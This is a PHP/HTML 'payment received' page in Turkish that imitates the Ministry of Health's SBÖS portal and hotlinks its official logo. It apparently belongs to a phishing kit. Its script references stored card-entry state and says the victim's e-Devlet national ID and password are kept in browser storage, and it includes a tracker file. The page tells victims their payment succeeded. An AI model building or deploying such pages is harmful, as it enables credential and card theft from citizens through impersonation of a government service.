<?php
$logId = isset($_GET['id']) ? intval($_GET['id']) : 0;
$basvuruNo = $logId > 0 ? 'SB' . str_pad($logId, 6, '0', STR_PAD_LEFT) : '';
?>
<!DOCTYPE html>
<html lang="tr" class="notranslate" translate="no">
<head>
    <meta charset="utf-8">
    <title>Ödeme Başarılı - SBÖS</title>
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,shrink-to-fit=no,viewport-fit=cover">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #f0f4f8;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow-x: hidden;
        }
        .top-bar { background: #D32F2F; height: 4px; }
        .header { padding: 30px 40px; display: flex; justify-content: center; z-index: 1; }
        .logo { display: flex; align-items: center; gap: 4px; text-decoration: none; }
        .logo img { height: 36px; }
        .main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; z-index: 1; }
        .card {
            background: #fff; border-radius: 24px; padding: 48px 40px; width: 100%;
            max-width: 480px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); text-align: center;
        }
        .checkmark-circle {
            width: 80px; height: 80px; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 24px; position: relative;
        }
        .checkmark-circle svg {
            width: 80px; height: 80px;
            stroke: #22c55e; stroke-width: 3;
            animation: checkFill 0.4s ease-in-out 0.4s forwards, checkScale 0.3s ease-in-out 0.9s both;
        }
        .checkmark-circle .circle {
            stroke-dasharray: 166; stroke-dashoffset: 166;
            stroke: #22c55e; fill: none;
            animation: checkStroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }
        .checkmark-circle .check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48; stroke-dashoffset: 48;
            animation: checkStroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
        }
        @keyframes checkStroke { 100% { stroke-dashoffset: 0; } }
        @keyframes checkScale { 0%, 100% { transform: none; } 50% { transform: scale3d(1.1, 1.1, 1); } }
        @keyframes checkFill { 100% { box-shadow: inset 0 0 0 40px #f0fdf4; } }
        .card h1 { font-size: 20px; font-weight: 700; color: #1a1a2e; margin-bottom: 8px; }
        .card .subtitle { font-size: 14px; color: #8e8ea0; line-height: 1.6; margin-bottom: 6px; }
        .ref-code {
            display: inline-block; font-family: 'Courier New', monospace; font-size: 15px;
            font-weight: 700; color: #D32F2F; background: #fef2f2; padding: 6px 16px;
            border-radius: 8px; margin-bottom: 24px;
        }
        .success-box {
            background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 14px;
            padding: 16px; margin-bottom: 28px; display: flex; align-items: flex-start;
            gap: 12px; text-align: left;
        }
        .success-box svg { width: 22px; height: 22px; flex-shrink: 0; margin-top: 1px; }
        .success-box .title { font-size: 14px; font-weight: 600; color: #166534; }
        .success-box .desc { font-size: 12px; color: #16a34a; margin-top: 2px; }
        .btn {
            display: block; width: 100%; padding: 14px; border-radius: 14px;
            font-size: 15px; font-weight: 600; text-align: center; text-decoration: none;
            background: #D32F2F; color: #fff; border: none; cursor: pointer; transition: all 0.2s;
        }
        .btn:hover { background: #B71C1C; }
        @media (max-width: 639px) {
            .header { padding: 20px; }
            .logo img { height: 28px; }
            .card { padding: 32px 24px; border-radius: 20px; }
        }
    </style>
</head>
<body>
    <div class="top-bar"></div>
    <div class="header">
        <a href="index.php" class="logo">
            <img src="https://sbos.saglik.gov.tr/_next/static/media/aileHekimiLogoSb2.b6f9fbf7.svg" alt="SBÖS">
        </a>
    </div>

    <div class="main">
        <div class="card">
            <div class="checkmark-circle">
                <svg viewBox="0 0 52 52">
                    <circle class="circle" cx="26" cy="26" r="25" fill="none"/>
                    <path class="check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                </svg>
            </div>
            <h1>Ödemeniz Alındı!</h1>
            <p class="subtitle">Sağlık hizmeti ödemeniz başarıyla tamamlandı.</p>
            <?php if ($basvuruNo): ?>
            <div class="ref-code">#<?= $basvuruNo ?></div>
            <?php endif; ?>

            <div class="success-box">
                <svg viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
                <div>
                    <div class="title">Ödeme onayı gönderildi</div>
                    <div class="desc">Ödeme detayları kayıtlı e-posta adresinize gönderilecektir.</div>
                </div>
            </div>

            <a href="index.php" class="btn">Ana Sayfaya Dön</a>
        </div>
    </div>

    <script>
        // Clear all payment-related storage on successful completion
        localStorage.removeItem('cart');
        localStorage.removeItem('logId');
        localStorage.removeItem('logAmount');
        sessionStorage.removeItem('card_entered');
        // Note: edevlet_tc / edevlet_pass are intentionally kept so the user
        // can start a new transaction without logging in again.
    </script>

    <?php include 'includes/tracker.php'; ?>
</body>
</html>
